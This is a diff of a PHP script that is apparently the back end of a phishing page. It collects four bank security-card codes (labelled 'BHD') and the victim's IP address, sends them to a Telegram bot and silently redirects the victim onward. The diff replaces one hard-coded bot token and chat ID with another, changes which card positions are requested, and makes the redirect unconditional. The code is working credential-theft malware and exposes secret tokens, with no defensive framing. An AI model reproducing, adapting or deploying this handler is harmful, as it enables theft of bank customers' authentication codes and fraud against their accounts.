@@ -1,20 +1,18 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $co1 = $_POST["co1"];
-	$co2 = $_POST["co2"];
-	$co3 = $_POST["co3"];
-	$co4 = $_POST["co4"];
-	
-  $botToken = "7356380446:AAERwTFEndqW0wSfHHhuajIg70Ld8fSW6GM"; // Reemplaza con tu token de bot
-    $chatID = "5868379051"; // Reemplaza con tu chat ID
-
-    // Obtén la IP del cliente
-    $ip = $_SERVER['REMOTE_ADDR'];
-
-    // Construye el mensaje
-    $message = "=====CODIGO 2 BHD=======\n 21: $co1\n 11: $co2\n 8: $co3\n 40: $co4\nIP del cliente: $ip";
-
-    // Envia el mensaje a Telegram
+    $co1 = $_POST["co1"] ?? '';
+    $co2 = $_POST["co2"] ?? '';
+    $co3 = $_POST["co3"] ?? '';
+    $co4 = $_POST["co4"] ?? '';
+    
+    $botToken = "8857815714:AAFp5JutGMJPmwrZf5NwiigjazGNVbnJEB4";
+    $chatID = "8555745789";
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+    
+    $message = "=====CÓDIGOS 2 BHD=======\n";
+    $message .= "31: $co1\n20: $co2\n14: $co3\n5: $co4\n";
+    $message .= "IP del cliente: $ip";
+    
     $url = "https://api.telegram.org/bot$botToken/sendMessage";
     $data = array("chat_id" => $chatID, "text" => $message);
     $options = array(
@@ -25,16 +23,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         )
     );
     $context = stream_context_create($options);
-    $result = file_get_contents($url, false, $context);
-
-    if ($result) {
-        // Redirige a la página de éxito
-        header("Location: pa04.php");
-        exit; // Asegura que el script se detenga después de la redirección
-    } else {
-        // Redirige a la página de error
-        header("Location: index");
-        exit;
-    }
+    @file_get_contents($url, false, $context);
+    
+    header("Location: pa04.php");
+    exit;
 }
 ?>
